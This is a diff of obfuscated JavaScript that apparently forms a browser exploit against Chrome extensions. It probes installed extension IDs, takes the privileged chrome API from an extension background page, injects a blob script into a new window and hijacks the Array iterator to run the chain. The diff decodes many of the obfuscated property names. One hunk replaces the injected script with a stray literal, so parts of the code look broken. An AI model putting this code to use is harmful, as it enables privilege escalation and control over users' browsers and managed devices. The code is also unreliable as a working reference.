@@ -198,11 +198,11 @@ const m = function() {
 async function g(n) {
     let _;
     try {
-        _ = await window[`fetch`](`chrome-extension://` + n + d`}` + d(а.at(d`\x01\x00`)))
+        _ = await window[`fetch`](`chrome-extension://` + n + `/` + d(а.at(`10`)))
     } catch (D) {
         return 0
     }
-    return 200 === _[d`CD1DEC`] ? 1 : 0
+    return 200 === _[`status`] ? 1 : 0
 }
 async function gSI() {
     return await g(SI.NEW) ? SI.NEW : await g(SI.OLD) ? SI.OLD : await g(SI.BETA) ? SI.BETA : SI.NONE
@@ -211,13 +211,13 @@ async function gSI() {
 function e(n, _) {
     let D = function(n) {
             let _ = open();
-            _.chrome = top.chrome[d`5HD5>C9?>`][d`75D\x1213;7B?E>4 175`]().chrome;
-            let D = document[d`3B51D5\x15<5=5>D`]("script");
+            _.chrome = top.chrome[`extension`][`getBackgroundPage`]().chrome;
+            let D = document[`createElement`]("script");
             D.src = n, _.document.body.appendChild(D), top.close()
         },
-        x = URL[d`3B51D5\x1F2:53D%"\x1C`](n),
-        $ = new window[d`\x12<?2`]([`${o};${d};(${D})("${x}")`], {
-            type: d`D5HD}:1F1C3B9@D`
+        x = URL[`createObjectURL`](n),
+        $ = new window[`Blob`]([`\x12<?2`], {
+            type: `text/javascript`
         }),
         C = URL[d`3B51D5\x1F2:53D%"\x1C`]($),
         t = d`\fCDI<5\x0ExKF9C929<9DI\n89445>M\f}CDI<5\x0EXnnnn\f96B1=5nCB34?3\rp\fC3B9@DnCB3\ru` + C + d`u\x0E\f}C3B9@D\x0Ep\x0EXnnnnnnnn\x189|n\x196nI?En31>nB514nD89CznD85n5H@<?9Dn494>uDnG?B;|Xnnnnnnnn'19Dn1n3?E@<5n?6nG55;C|n'5u<<n25n213;|||Xnnnn\f}96B1=5\x0E`;
@@ -226,7 +226,7 @@ function e(n, _) {
 
 function gS2U(n) {
     return e(new window[d`\x12<?2`]([`${o};${d};(${m})()`], {
-        type: d`D5HD}:1F1C3B9@D`
+        type: `text/javascript`
     }), n)
 } [].__proto__[window[o`\x05+\x1F\x14!\x1E`][d`9D5B1D?B`]] = function*() {
     yield gS2U.call(this[0], this[1])
